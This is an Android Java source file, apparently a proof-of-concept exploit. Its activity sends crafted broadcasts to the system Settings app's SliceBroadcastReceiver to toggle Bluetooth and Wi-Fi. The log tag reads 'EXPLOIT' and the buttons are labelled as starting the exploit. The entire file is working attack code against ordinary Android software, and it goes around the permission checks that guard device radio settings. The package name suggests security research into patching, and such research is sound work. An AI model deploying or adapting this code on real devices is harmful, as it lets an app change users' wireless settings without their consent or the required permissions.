package dev.virtualpatch.changedevicesettings;

import androidx.appcompat.app.AppCompatActivity;

import android.app.slice.Slice;
import android.content.Intent;
import android.os.Bundle;
import android.provider.SettingsSlicesContract;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    private Button button;
    private TextView tw;
    private Button button2;
    private TextView tw2;
    public static final String TAG = "EXPLOIT";
    public static final String ACTION_BLUETOOTH_SLICE_CHANGED = "com.android.settings.bluetooth.action.BLUETOOTH_MODE_CHANGED";
    public static final String ACTION_WIFI_SLICE_CHANGED = "com.android.settings.wifi.action.WIFI_CHANGED";
    private boolean bluetooth, wifi;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        button = findViewById(R.id.start_exploit);
        tw = findViewById(R.id.textView);
        button2 = findViewById(R.id.start_exploit2);
        tw2 = findViewById(R.id.textView2);
    }

    @Override
    protected void onStart() {
        super.onStart();
        bluetooth = false;
        button.setOnClickListener((view) -> {
            Log.wtf(TAG, "bluetooth");
            Intent intent = new Intent();

            intent.setAction(ACTION_BLUETOOTH_SLICE_CHANGED);
            intent.setClassName("com.android.settings", "com.android.settings.slices.SliceBroadcastReceiver");

            intent.putExtra("com.android.settings.slice.extra.key", SettingsSlicesContract.KEY_BLUETOOTH);
            intent.putExtra(Slice.EXTRA_TOGGLE_STATE, !bluetooth);
            bluetooth = !bluetooth;
            sendBroadcast(intent);

            tw.setText("Bluetooth: "+String.valueOf(bluetooth));
            //sendImplicitBroadcast(this, intent);
        });

        wifi = true;
        button2.setOnClickListener((view) -> {
            Log.wtf(TAG, "wifi");

            Intent intent = new Intent();

            intent.setAction(ACTION_WIFI_SLICE_CHANGED);

            intent.setClassName("com.android.settings", "com.android.settings.slices.SliceBroadcastReceiver");

            intent.putExtra("com.android.settings.slice.extra.key", SettingsSlicesContract.KEY_WIFI);
            intent.putExtra(Slice.EXTRA_TOGGLE_STATE, !wifi);
            sendBroadcast(intent);
            wifi = !wifi;
            tw2.setText("WIFI: "+String.valueOf(wifi));
        });
    }
}